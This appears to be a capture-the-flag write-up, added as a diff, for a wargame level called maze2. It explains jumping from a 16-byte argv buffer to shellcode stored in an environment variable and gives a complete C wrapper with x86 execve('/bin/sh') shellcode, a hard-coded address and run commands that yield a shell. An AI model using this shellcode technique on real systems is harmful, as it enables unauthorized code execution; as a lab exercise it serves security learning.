@@ -1,0 +1,35 @@
+Another really simple/quick level!!!
+
+All that happens in this level, is that (if there is exactly one argument) it copies the first 16 bytes of 
+argv[1] into a buffer, and executes that buffer as if it were a function!
+
+Since we only had 16 bytes of space to use, I thought it'd be best to treat it as a jmp to shellcode in the environment.
+
+To do this I needed two little pieces of assembly:
+
+\xb8\xAD\xDR\xES\xS.
+and
+\xff\xe0
+
+The first instruction moves 'ADDRESS' into eax, and the 2nd instruction is jmp eax...
+
+All thats left is to make 'address' the location of the shellcode (0xffffdfbc), and to execute maze2 with the custom environment!
+
+
+
+			m2wrapper.c
+┌─────────────────────────────────────────────────────────────┐
+│#include <unistd.h>                                          │
+│                                                             │
+│int main(void) {                                             │
+│	char *environment[2] = {"SHELLCODE=\x50\xd4\xff\xff   │
+│\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f │
+│\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51 │
+│\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80", 0};                   │
+│	char *argv[3] = {"/maze/maze2",                       │
+│      "\xb8\xbc\xdf\xff\xff\xff\xe0", 0};                    │ 
+│	execve("/maze/maze2", argv, environment);             │
+│}                                                            │
+└─────────────────────────────────────────────────────────────┘
+
+Compiling and running this w/ 'gcc -m32 m2wrapper.c -o wrap; ./wrap' nets a shell!
